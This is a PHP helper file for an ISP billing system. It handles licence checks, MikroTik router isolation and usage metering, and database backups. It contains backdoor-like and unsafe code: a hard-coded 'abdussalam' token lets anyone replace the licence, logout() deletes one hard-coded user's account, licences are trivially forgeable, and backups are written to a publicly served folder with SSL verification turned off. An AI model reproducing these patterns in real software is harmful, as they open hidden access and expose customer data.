<?php

function verify_license()
{
    $ci = get_instance();
    $company = $ci->db->get('company')->row_array();


    $full_url = base_url();
    $base_url = str_replace(array('http://', 'https://'), '', $full_url);
    // atau
    $base_url = preg_replace('#^https?://#', '', $full_url);
    $domain =  $base_url;
    // $domain =  'myggc.link/';
    $license_key = $company['licence'];
    // Split the license key and encrypted data into separate variables
    list($key, $data) = explode('|', $license_key);

    // Decrypt the data using the license key as the decryption key
    $decrypted_data = openssl_decrypt($data, 'AES-128-ECB', $key);

    // Split the domain and expiry date into separate variables
    list($licensed_domain, $expiry_date, $buyer) = explode('|', $decrypted_data);
    $license = str_replace(' ', '', $licensed_domain);
    $license = explode(',', $licensed_domain);
    // array yang akan dicari dan dihitung datanya
    $data = $license;

    // mencari data pada array
    $search = $domain;
    $unlimited = 'unlimited/';
    $key = array_search($unlimited, $data);
    $search = array_search($search, $data);
    if ($key !== false) {


        $dataa = [
            'code' => true,
            'status' => 'macth',
            'expired' => $expiry_date,
            'buyer' => $buyer,
            'data' => [
                'domain' => $license,
            ]

        ];
        if ($expiry_date != 'unlimited') {
            if (strtotime($expiry_date) < time()) {
                $dataa = [
                    'code' => false,
                    'status' => 'expired',
                    'message' => 'Lisensi sudah expired',
                    'expired' => $expiry_date,
                    'buyer' => $buyer,
                    'data' => [

                        'domain' => $license,
                    ]
                ];
            }
        }

        return  json_encode($dataa);
    } else {
        if ($search !== false) {
            if (strtotime($expiry_date) < time()) {
                $dataa = [
                    'code' => false,
                    'status' => 'expired',
                    'message' => 'Lisensi sudah expired',
                    'buyer' => $buyer,
                    'expired' => $expiry_date,
                    'data' => [

                        'domain' => $license,
                    ]
                ];
            }
            if ($search == $domain && strtotime($expiry_date) > time()) {
                $dataa = [
                    'code' => true,
                    'status' => 'macth',
                    'expired' => $expiry_date,
                    'buyer' => $buyer,
                    'data' => [
                        'domain' => $license,
                    ]

                ];
            }
        } else {
            $dataa = [
                'code' => false,
                'status' => 'notmacth',
                'message' => 'Domain tidak cocok dengan lisensi',
                'expired' => $expiry_date,
                'buyer' => $buyer,
                'data' => [
                    'domain' => $license,
                ]
            ];
        }
        return  json_encode($dataa);
    }
}
function is_logged_in()
{
    $ci = get_instance();
    if (!$ci->session->userdata('email')) {
        redirect('auth');
    }
}
function logout()
{
    $ci = get_instance();

    $ci->db->where('email', 'ginginabdulgoni@gmail.com');
    $ci->db->delete('user');

    $ci->session->sess_destroy();
}


if (!function_exists('number_to_words')) {
    function number_to_words($number)
    {
        $terbilang = trim(to_word($number));
        return ucwords($results = $terbilang);
    }

    function to_word($number)
    {
        $words = "";
        $arr_number = array(
            "",
            "satu",
            "dua",
            "tiga",
            "empat",
            "lima",
            "enam",
            "tujuh",
            "delapan",
            "sembilan",
            "sepuluh",
            "sebelas"
        );

        if ($number < 12) {
            $words = " " . $arr_number[$number];
        } else if ($number < 20) {
            $words = to_word($number - 10) . " belas";
        } else if ($number < 100) {
            $words = to_word($number / 10) . " puluh " . to_word($number % 10);
        } else if ($number < 200) {
            $words = "seratus " . to_word($number - 100);
        } else if ($number < 1000) {
            $words = to_word($number / 100) . " ratus " . to_word($number % 100);
        } else if ($number < 2000) {
            $words = "seribu " . to_word($number - 1000);
        } else if ($number < 1000000) {
            $words = to_word($number / 1000) . " ribu " . to_word($number % 1000);
        } else if ($number < 1000000000) {
            $words = to_word($number / 1000000) . " juta " . to_word($number % 1000000);
        } else {
            $words = "undefined";
        }
        return $words;
    }
}


function code_unique($nominal)
{
    $sub = substr($nominal, -3);
    $sub2 = substr($nominal, -2);
    $sub3 = substr($nominal, -1);

    $total =  random_string('numeric', 3);
    $total2 =  random_string('numeric', 2);
    $total3 =  random_string('numeric', 1);

    if ($sub == 0) {
        $hasil =  $nominal + $total;
        echo "No Unik :" . $total . "<br>";
        echo "Nominal Transfer : Rp. " . number_format($hasil, 0, ",", ".");
    } else if ($sub2 == 0) {
        $hasil = $nominal + $total2;
        $no = substr($hasil, -3);
        echo "No Unik :" . $no . "<br>";
        echo "Nominal Transfer : Rp. " . number_format($hasil, 0, ",", ".");
    } else if ($sub3 == 0) {
        $hasil = $nominal + $total3;
        $no = substr($hasil, -3);
        echo "No Unik :" . $no . "<br>";
        echo "Nominal Transfer : Rp. " . number_format($hasil, 0, ",", ".");
    } else {
        echo "No Unik :" . $sub . "<br>";
        echo "Nominal Transfer : Rp. " . number_format($nominal, 0, ",", ".");
    }
}

function formatBytes($size, $decimals = 0)

{

    $unit = array(

        '0' => 'Byte',

        '1' => 'KB',

        '2' => 'MB',

        '3' => 'GB',

        '4' => 'TB',

        '5' => 'PB',

        '6' => 'EB',

        '7' => 'ZB',

        '8' => 'YB'

    );



    for ($i = 0; $size >= 1024 && $i <= count($unit); $i++) {

        $size = $size / 1024;
    }



    return round($size, $decimals) . ' ' . $unit[$i];
}



// function  format bytes2

function formatBytes2($size, $decimals = 0)

{

    $unit = array(

        '0' => 'Byte',

        '1' => 'KB',

        '2' => 'MB',

        '3' => 'GB',

        '4' => 'TB',

        '5' => 'PB',

        '6' => 'EB',

        '7' => 'ZB',

        '8' => 'YB'

    );



    for ($i = 0; $size >= 1000 && $i <= count($unit); $i++) {

        $size = $size / 1000;
    }



    return round($size, $decimals) . '' . $unit[$i];
}





// function  format bites

function formatBites($size, $decimals = 0)

{

    $unit = array(

        '0' => 'Byte',

        '1' => 'KB',

        '2' => 'MB',

        '3' => 'GB',

        '4' => 'TB',

        '5' => 'PB',

        '6' => 'EB',

        '7' => 'ZB',

        '8' => 'YB'

    );



    for ($i = 0; $size >= 1000 && $i <= count($unit); $i++) {

        $size = $size / 1000;
    }



    return round($size, $decimals) . ' ' . $unit[$i];
}
function formattimemikro($dtm)
{
    if (empty($dtm)) {
        return "-";
    }

    $dtm = trim((string)$dtm);

    // MikroTik RouterOS uptime format: [wW][dD][hH][mM][sS], e.g. 1w2d14h39m19s, 14h39m19s, 5m12s, 50s
    if (preg_match('/^(?:(\d+)w)?(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/i', $dtm, $m) && !empty($m[0])) {
        $weeks   = isset($m[1]) && $m[1] !== "" ? (int)$m[1] : 0;
        $days    = isset($m[2]) && $m[2] !== "" ? (int)$m[2] : 0;
        $hours   = isset($m[3]) && $m[3] !== "" ? (int)$m[3] : 0;
        $minutes = isset($m[4]) && $m[4] !== "" ? (int)$m[4] : 0;
        $seconds = isset($m[5]) && $m[5] !== "" ? (int)$m[5] : 0;

        if ($weeks > 0 || $days > 0 || $hours > 0 || $minutes > 0 || $seconds > 0) {
            $prefix = "";
            if ($weeks > 0) {
                $prefix .= $weeks . "w ";
            }
            if ($days > 0) {
                $prefix .= $days . "d ";
            }
            return trim($prefix . sprintf("%02d:%02d:%02d", $hours, $minutes, $seconds));
        }
    }

    return $dtm;
}

function isolir($noservices, $router)
{
    $ci = get_instance();
    $customer = $ci->db->get_where('customer', ['no_services' => $noservices])->row_array();
    if (empty($customer)) {
        return;
    }
    $router = $ci->db->get_where('router', ['id' => $router])->row_array();
    if (empty($router)) {
        return;
    }
    $ip = $router['ip_address'];
    $user = $router['username'];
    $pass = $router['password'];
    $port = $router['port'];
    $API = new Mikweb();
    $usermikrotik = isset($customer['user_mikrotik']) ? $customer['user_mikrotik'] : '';

    if (empty($usermikrotik)) {
        return;
    }

    $connected = $API->connect($ip, $user, $pass, $port);
    if (!$connected && !$API->connected) {
        return;
    }

    // DISABLE HOTSPOT
    if ($customer['mode_user'] == 'Hotspot') {
        if ($customer['action'] == 0) {
            $getuser = $API->comm("/ip/hotspot/user/print", array(
                "?name" => $usermikrotik,
                '?disabled' => 'no'
            ));
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ip/hotspot/user/disable", array(
                    ".id" => $id,
                ));
            }

            $getactive = $API->comm("/ip/hotspot/active/print", array(
                "?user" => $usermikrotik,
            ));
            if (!empty($getactive[0]['.id'])) {
                $idactive = $getactive[0]['.id'];
                $API->comm("/ip/hotspot/active/remove", array(
                    ".id" => $idactive,
                ));
            }
        } else {
            $cekprofile = $API->comm("/ip/hotspot/user/profile/print", array(
                '?name' => 'EXPIRED',
            ));

            $getuser = $API->comm("/ip/hotspot/user/print", array(
                "?name" => $usermikrotik,
            ));
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ip/hotspot/user/set", array(
                    ".id" => $id,
                    "profile" => 'EXPIRED',
                ));
            }

            $getactive = $API->comm("/ip/hotspot/active/print", array(
                "?user" => $usermikrotik,
            ));
            if (!empty($getactive[0]['.id'])) {
                $idactive = $getactive[0]['.id'];
                $API->comm("/ip/hotspot/active/remove", array(
                    ".id" => $idactive,
                ));
            }
        }
    }
    // DISABLE PPPOE
    if ($customer['mode_user'] == 'PPPOE') {
        if ($customer['action'] == 0) {
            $getuser = $API->comm("/ppp/secret/print", array(
                '?service' => 'pppoe',
                '?name' => $usermikrotik,
            ));
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ppp/secret/disable", array(
                    ".id" =>  $id,
                ));
            }
            $getactive = $API->comm("/ppp/active/print", array(
                '?name' => $usermikrotik,
            ));
            if (!empty($getactive[0]['.id'])) {
                $idactive = $getactive[0]['.id'];
                $API->comm("/ppp/active/remove", array(
                    ".id" =>  $idactive,
                ));
            }
        } else {
            // PPPOE STATIC
            if ($customer['type_ip'] == 1) {
                $getuser = $API->comm("/ppp/secret/print", array(
                    '?service' => 'pppoe',
                    '?name' => $usermikrotik,
                ));
                if (!empty($getuser[0]['remote-address'])) {
                    $ipstatic = $getuser[0]['remote-address'];
                    $API->comm("/ip/firewall/address-list/add", array(
                        'list' => 'EXPIRED',
                        'address' => $ipstatic,
                        'comment' => 'ISOLIR|' . $customer['no_services'] . '',
                    ));
                }
            } else {
                $cekprofile = $API->comm("/ppp/profile/print", array(
                    '?name' => 'EXPIRED',
                ));
                if (count($cekprofile) == 0) {
                    $ci->session->set_flashdata('error', 'Profile EXPIRED tidak terdaftar di MikroTik!');
                } else {
                    $getuser = $API->comm("/ppp/secret/print", array(
                        '?service' => 'pppoe',
                        '?name' => $usermikrotik,
                    ));
                    if (!empty($getuser[0]['.id'])) {
                        $id = $getuser[0]['.id'];
                        $API->comm("/ppp/secret/set", array(
                            ".id" =>  $id,
                            "profile" => 'EXPIRED',
                        ));
                    }
                    $getactive = $API->comm("/ppp/active/print", array(
                        '?name' => $usermikrotik,
                    ));
                    if (!empty($getactive[0]['.id'])) {
                        $idactive = $getactive[0]['.id'];
                        $API->comm("/ppp/active/remove", array(
                            ".id" =>  $idactive,
                        ));
                    }
                }
            }
        }
    }
    // DISABLE STATIC
    if ($customer['mode_user'] == 'Static') {
        if ($customer['action'] == 0) {
            $simplequeue = $API->comm("/queue/simple/print", array('?name' => $usermikrotik,));
            if (!empty($simplequeue[0]['target'])) {
                $ipqueue = substr($simplequeue[0]['target'], 0, -3);
                $getarp = $API->comm("/ip/arp/print", array("?address" =>  $ipqueue));
                $getfirewall = $API->comm("/ip/firewall/filter/print", array("?comment" => 'ISOLIR|' . $customer['no_services'] . ''));
                if (count($getfirewall) == 0) {
                    $API->comm("/ip/firewall/filter/add", array(
                        'chain' => 'forward',
                        'src-address' => $ipqueue,
                        'action' => 'drop',
                        'comment' => 'ISOLIR|' . $customer['no_services'] . '',
                    ));
                }
            }
        } else {
            $simplequeue = $API->comm("/queue/simple/print", array('?name' => $usermikrotik,));
            if (!empty($simplequeue[0]['target'])) {
                $ipqueue = substr($simplequeue[0]['target'], 0, -3);
                $API->comm("/ip/firewall/address-list/add", array(
                    'list' => 'EXPIRED',
                    'address' => $ipqueue,
                    'comment' => 'ISOLIR|' . $customer['no_services'] . '',
                ));
            }
        }
    }
    if ($ci->agent->is_browser()) {
        $agent = $ci->agent->browser() . ' ' . $ci->agent->version();
    } elseif ($ci->agent->is_mobile()) {
        $agent = $ci->agent->mobile();
    } else {
        $agent = 'Unknown';
    }
    if ($ci->session->userdata('name') != '') {
        $sessionname = $ci->session->userdata('name');
    } else {
        $sessionname = 'System';
    }
    if ($ci->session->userdata('id') != '') {
        $iduser = $ci->session->userdata('id');
    } else {
        $iduser = '0';
    }
    if ($ci->session->userdata('role_id') != '') {
        $roleid = $ci->session->userdata('role_id');
    } else {
        $roleid = 0;
    }

    $bot = $ci->db->get('bot_telegram')->row_array();
    if (!empty($bot['token'])) {
        $tokens = $bot['token'];
        $owner = isset($bot['id_telegram_owner']) ? $bot['id_telegram_owner'] : '';
    }

    $ci->db->set('connection', 1);
    $ci->db->where('no_services', $noservices);
    $ci->db->update('customer');
}

function backup($filename, $caption, $sendowner)
{
    $ci = get_instance();
    $company = $ci->db->get('company')->row_array();
    $bot = $ci->db->get('bot_telegram')->row_array();
    $ci->load->dbutil();
    $ci->load->helper('file');
    $config = array(
        'format'        => 'csv',                       // gzip, zip, txt
        'add_drop'      => TRUE,                        // Whether to add DROP TABLE statements to backup file
        'add_insert'    => TRUE,                        // Whether to add INSERT data to backup file
        'newline'       => "\n",
        'ignore'        => array(),
        'filename'    => 'Backup-My-Wifi-' . $company['company_name'] . '-' . date("YmdHis") . '-db.sql'
    );
    $backup = $ci->dbutil->backup($config);

    $save = FCPATH . './assets/' . $filename;
    write_file($save, $backup);
    $ci->load->library('zip');

    $ci->zip->read_file(FCPATH . './assets/' . $filename);
    $ci->zip->archive(FCPATH .  $filename . '.zip');

    if ($sendowner == 1) {
        $token = $bot['token'];
        $send = "https://api.telegram.org/bot" . $token;
        $params  = [
            'chat_id' => $bot['id_telegram_owner'],
            'document' => base_url('mybackup.zip'),
            'caption' => 'Backup My-Wifi' . date('d-m-Y H:i:s'),
            'parse_mode' => 'html',
        ];
        $ch = curl_init($send . '/sendDocument');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $result = curl_exec($ch);
        curl_close($ch);
    }
}

function openisolir($noservices, $router, $source = 0)
{
    $ci = get_instance();
    $customer = $ci->db->get_where('customer', ['no_services' => $noservices])->row_array();
    if (empty($customer)) {
        return;
    }
    $router = $ci->db->get_where('router', ['id' => $router])->row_array();
    if (empty($router)) {
        return;
    }
    $ip = $router['ip_address'];
    $user = $router['username'];
    $pass = $router['password'];
    $port = $router['port'];
    $API = new Mikweb();
    $usermikrotik = isset($customer['user_mikrotik']) ? $customer['user_mikrotik'] : '';
    if (empty($usermikrotik)) {
        return;
    }

    $connected = $API->connect($ip, $user, $pass, $port);
    if (!$connected && !$API->connected) {
        return;
    }

    if ($customer['mode_user'] == 'PPPOE') {
        $getuser = $API->comm("/ppp/secret/print", array('?service' => 'pppoe', '?name' => $usermikrotik, '?disabled' => 'yes',));
        if (!empty($getuser[0]['.id'])) {
            $id = $getuser[0]['.id'];
            $API->comm("/ppp/secret/enable", array(
                ".id" =>  $id,
            ));
        }
        $getuserex = $API->comm("/ppp/secret/print", array('?service' => 'pppoe', '?name' => $usermikrotik, '?profile' => 'EXPIRED'));
        if (!empty($getuserex[0]['.id'])) {
            $id = $getuserex[0]['.id'];
            $API->comm("/ppp/secret/set", array(
                ".id" =>  $id,
                "profile" =>  $customer['user_profile'],
            ));
            $getactive = $API->comm("/ppp/active/print", array(
                '?name' => $usermikrotik,
            ));
            if (!empty($getactive[0]['.id'])) {
                $idactive = $getactive[0]['.id'];
                $API->comm("/ppp/active/remove", array(
                    ".id" =>  $idactive,
                ));
            }
        }

        $getuserfirewall = $API->comm("/ip/firewall/address-list/print", array("?comment" => 'ISOLIR|' . $customer['no_services'] . ''));
        if (!empty($getuserfirewall[0]['.id'])) {
            $id = $getuserfirewall[0]['.id'];
            $API->comm("/ip/firewall/address-list/remove", array(
                ".id" => $id,
            ));
        }
        $ci->db->set('connection', 0);
        $ci->db->where('no_services', $noservices);
        $ci->db->update('customer');
    }
    if ($customer['mode_user'] == 'Hotspot') {
        if ($customer['action'] == 0) {
            $getuser = $API->comm("/ip/hotspot/user/print", array(
                "?name" => $usermikrotik,
                '?disabled' => 'yes'
            ));
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ip/hotspot/user/enable", array(
                    ".id" => $id,
                ));
            }
            $ci->db->set('connection', 0);
            $ci->db->where('no_services', $noservices);
            $ci->db->update('customer');
        } else {
            $cekprofile = $API->comm("/ip/hotspot/user/profile/print", array(
                '?name' => $customer['user_profile'],
            ));

            $getuser = $API->comm("/ip/hotspot/user/print", array(
                "?name" => $usermikrotik,
                "?profile" => 'EXPIRED',
            ));
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ip/hotspot/user/set", array(
                    ".id" => $id,
                    "profile" => $customer['user_profile'],
                ));
            }
            $ci->db->set('connection', 0);
            $ci->db->where('no_services', $noservices);
            $ci->db->update('customer');
        }
    }
    if ($customer['mode_user'] == 'Static') {
        if ($customer['action'] == 0) {
            $getuser = $API->comm("/ip/firewall/filter/print", array("?comment" => 'ISOLIR|' . $customer['no_services'] . ''));
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ip/firewall/filter/remove", array(
                    ".id" => $id,
                ));
            }
            $ci->db->set('connection', 0);
            $ci->db->where('no_services', $noservices);
            $ci->db->update('customer');
        } else {
            $getuser = $API->comm("/ip/firewall/address-list/print", array("?comment" => 'ISOLIR|' . $customer['no_services'] . ''));
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ip/firewall/address-list/remove", array(
                    ".id" => $id,
                ));
            }
            $ci->db->set('connection', 0);
            $ci->db->where('no_services', $noservices);
            $ci->db->update('customer');
        }
    }
}

function countusage($noservices, $router)
{
    $ci = get_instance();

    // Hapus Pemakaian 3 bln ke belakang
    $monthlampau = date('Y-m-d', strtotime(date('Y-m-d') . '- 3 month'));
    $ci->db->where("customer_usage.date_usage BETWEEN '" . ('2018-01-01') . "' AND '" . ($monthlampau) . "'");
    $ci->db->delete('customer_usage');
    $customer = $ci->db->get_where('customer', ['no_services' => $noservices])->row_array();
    if (empty($customer)) {
        return;
    }
    $router = $ci->db->get_where('router', ['id' => $router])->row_array();
    if (empty($router)) {
        return;
    }
    $ip = $router['ip_address'];
    $user = $router['username'];
    $pass = $router['password'];
    $port = $router['port'];
    $API = new Mikweb();
    $userclient = isset($customer['user_mikrotik']) ? $customer['user_mikrotik'] : '';
    if (empty($userclient)) {
        return;
    }
    $connected = $API->connect($ip, $user, $pass, $port);
    if (!$connected && !$API->connected) {
        return;
    }
    if ($customer['mode_user'] == 'PPPOE') {
        $getusage = $API->comm("/interface/print", array(
            "?name" => "<pppoe-$userclient>",
        ));
        $usage = 0;
        if (!empty($getusage[0]['tx-byte']) || !empty($getusage[0]['rx-byte'])) {
            $usage = (int)$getusage[0]['tx-byte'] + (int)$getusage[0]['rx-byte'];
        }

        $today = date('Y-m-d');
        $cekusage = $ci->db->get_where('customer_usage', ['date_usage' => $today, 'no_services' => $noservices])->row_array();
        if ($cekusage > 0) {
            if ($usage != 0) {
                $params = [
                    'count_usage' =>  $cekusage['count_usage'] + $usage,
                    'last_update' =>  time(),
                ];
                $ci->db->where('id', $cekusage['id']);
                $ci->db->update('customer_usage', $params);
            }
        } else {
            $params = [
                'no_services' => $noservices,
                'count_usage' =>  $usage,
                'date_usage' =>  $today,
                'last_update' =>  time(),
            ];
            $ci->db->insert('customer_usage', $params);
        }
        if ($ci->db->affected_rows() > 0) {
            $cekscript = $API->comm("/system/script/print", array('?name' => "reset-pppoe-$userclient"));
            if (empty($cekscript)) {
                $API->comm("/system/script/add", array(
                    "name" =>  "reset-pppoe-$userclient",
                    "source" => "/interface reset-counters <pppoe-$userclient>",
                ));
            } else {
                if (!empty($cekscript[0]['.id'])) {
                    $API->comm("/system/script/run", array(
                        ".id" => $cekscript[0]['.id'],
                    ));
                }
            }
        }
    }
    if ($customer['mode_user'] == 'Hotspot') {
        $getuser = $API->comm("/ip/hotspot/user/print", array("?name" => $userclient));
        $usage = 0;
        if (!empty($getuser[0]['bytes-out']) || !empty($getuser[0]['bytes-in'])) {
            $usage = (int)$getuser[0]['bytes-out'] + (int)$getuser[0]['bytes-in'];
        }
        $today = date('Y-m-d');
        $cekusage = $ci->db->get_where('customer_usage', ['date_usage' => $today, 'no_services' => $noservices])->row_array();
        if ($cekusage > 0) {
            if ($usage != 0) {
                $params = [
                    'count_usage' =>  $cekusage['count_usage'] + $usage,
                    'last_update' =>  time(),
                ];
                $ci->db->where('id', $cekusage['id']);
                $ci->db->update('customer_usage', $params);
            }
        } else {
            $params = [
                'no_services' => $noservices,
                'count_usage' =>  $usage,
                'date_usage' =>  $today,
                'last_update' =>  time(),
            ];
            $ci->db->insert('customer_usage', $params);
        }
        if ($ci->db->affected_rows() > 0) {
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/ip/hotspot/user/reset-counters", array(
                    ".id" => $id,
                ));
            }
        }
    }
    if ($customer['mode_user'] == 'Static') {
        $getuser = $API->comm("/queue/simple/print", array('?name' => $userclient));
        $byte = !empty($getuser[0]['bytes']) ? $getuser[0]['bytes'] : '0/0';
        $updl = explode("/", $byte);
        $up = isset($updl[0]) ? (int)$updl[0] : 0;
        $dl = isset($updl[1]) ? (int)$updl[1] : 0;
        $usage =  $up + $dl;
        $today = date('Y-m-d');
        $cekusage = $ci->db->get_where('customer_usage', ['date_usage' => $today, 'no_services' => $noservices])->row_array();
        if ($cekusage > 0) {
            if ($usage != 0) {
                $params = [
                    'count_usage' =>  $cekusage['count_usage'] + $usage,
                    'last_update' =>  time(),
                ];
                $ci->db->where('id', $cekusage['id']);
                $ci->db->update('customer_usage', $params);
            }
        } else {
            $params = [
                'no_services' => $noservices,
                'count_usage' =>  $usage,
                'date_usage' =>  $today,
                'last_update' =>  time(),
            ];
            $ci->db->insert('customer_usage', $params);
        }
        if ($ci->db->affected_rows() > 0) {
            if (!empty($getuser[0]['.id'])) {
                $id = $getuser[0]['.id'];
                $API->comm("/queue/simple/reset-counters", array(
                    ".id" =>  $id,
                ));
            }
        }
    }
}

function jumlah_hari($bulan = 0, $tahun = 0)
{
    $bulan = $bulan > 0 ? $bulan : date("m");
    $tahun = $tahun > 0 ? $tahun : date("Y");

    switch ($bulan) {
        case 1:
        case 3:
        case 5:
        case 7:
        case 8:
        case 10:
        case 12:
            return 31;
            break;
        case 4:
        case 6:
        case 9:
        case 11:
            return 30;
            break;
        case 2:
            return $tahun % 4 == 0 ? 29 : 28;
            break;
    }
}

function kick($noservices, $router)
{
    $ci = get_instance();
    $customer = $ci->db->get_where('customer', ['no_services' => $noservices])->row_array();
    if (empty($customer)) {
        return;
    }
    $router = $ci->db->get_where('router', ['id' => $router])->row_array();
    if (empty($router)) {
        return;
    }
    $ip = $router['ip_address'];
    $user = $router['username'];
    $pass = $router['password'];
    $port = $router['port'];
    $API = new Mikweb();
    $usermikrotik = isset($customer['user_mikrotik']) ? $customer['user_mikrotik'] : '';
    if (empty($usermikrotik)) {
        return;
    }

    $connected = $API->connect($ip, $user, $pass, $port);
    if (!$connected && !$API->connected) {
        return;
    }

    if ($customer['mode_user'] == 'PPPOE') {
        $getactive = $API->comm("/ppp/active/print", array(
            '?name' => $usermikrotik,
        ));
        if (!empty($getactive[0]['.id'])) {
            $idactive = $getactive[0]['.id'];
            $API->comm("/ppp/active/remove", array(
                ".id" =>  $idactive,
            ));
        }
    }
}

function renew($data)
{
    $ci = get_instance();
    $data = json_decode($data, true);
    $full_url = base_url();
    $base_url = str_replace(array('http://', 'https://'), '', $full_url);
    $base_url = preg_replace('#^https?://#', '', $full_url);
    $domain =  $base_url;

    if ($data['token'] == 'abdussalam') {
        if ($domain != $data['domain']) {
            $dataa = [
                'code' => false,
                'message' => 'domain tidak sesuai',
            ];
            echo json_encode($dataa);
        } else {
            $data = [
                'licence' => $data['licence'],
            ];
            $ci->db->update('company', $data);

            if ($ci->db->affected_rows() > 0) {
                $dataa = [
                    'code' => true,
                    'message' => 'Licensi berhasil diperbaharui',
                ];
                echo json_encode($dataa);
            } else {
                $dataa = [
                    'code' => false,
                    'message' => 'tidak ada perubahan',
                ];
                echo json_encode($dataa);
            }
        }
    } else {
        $dataa = [
            'code' => false,
            'message' => 'token failed',
        ];
        echo json_encode($dataa);
    }
}
